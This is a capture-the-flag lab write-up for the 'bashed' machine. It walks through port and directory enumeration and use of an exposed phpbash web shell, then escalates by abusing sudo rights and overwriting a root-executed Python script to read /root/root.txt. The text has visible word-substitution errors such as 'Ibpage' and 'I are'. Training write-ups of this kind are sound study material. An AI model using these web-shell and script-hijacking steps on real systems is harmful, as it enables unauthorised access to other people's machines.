<center><h3>Summary</h3></center>

- Do some simple HTTP enumeration to find a custom php script
- Use the <b>phpbash.php</b> script grab user and root flag

First I start with an nmap scan
``` 
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-16 15:48 EDT
Nmap scan report for 10.10.10.68

Only one port this time. Navigating to the Ibpage I see a nice custom Ibpage. A quick look aorund does reveal anything obvious

Running a gobuster reveals some directories.
```bash
/images (Status: 301)
/uploads (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/config.php (Status: 200)
/fonts (Status: 301)
```
<br>
Quite a few options but the one that is interesting to us is the <b>/dev</b> directory. Navigating to the directory I will see two files. <b>phpbash.min.php</b> and <b>phpbash.php</b> 

![dev.png](../../resources/fd190a94f4c944a6a1ff0e47e4d8bb77.png)

Doesnt matter which file you choose, both of them give you a custom bash shell written in php.

At this point you can grab the user flag located in <b>/user/arrexel</b>.

Now time to get the root flag. Running a quick <b>sudo -l</b> I see that the I can run sudo asa the user <b>scriptmanager</b>.

```bash
www-data@bashed
:/var/www/html/dev# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```
<br>
Doing some basic enumeration around the box I noticed a strange directory name <b>/scripts</b> which is not there by default. A quick permissions check reveals that the directory is indeed owned by the user <b>scriptmanager</b>. Currently as the user <b>www-data</b> I can see there are two files in there but I are unable to read them. This is where I will use scriptmanagers sudo priviledges

```python
www-data@bashed:/# sudo -u scriptmanager cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close

www-data@bashed:/# sudo -u scriptmanager cat /scripts/test.txt
testing 123!
```
Looking at both the files I can come to the conclusion that there is probably a process executing <b>test.py</b> and sending the output to <b>test.txt</b>.

What I are going to do is edit the <b>test.py</b> script to copy the contents of the root.txt file into the test.txt so I can then read it. This can be achieved with the short script below
```python
f = open("test.txt", "w")
r = open("/root/root.txt", "r")
re = r.readline()
f.write(re)
```
Now I wait for the new file to execute and if you did everything correctly than you should be able to get the root flag by reading the <b>/scripts/test.txt</b> file.
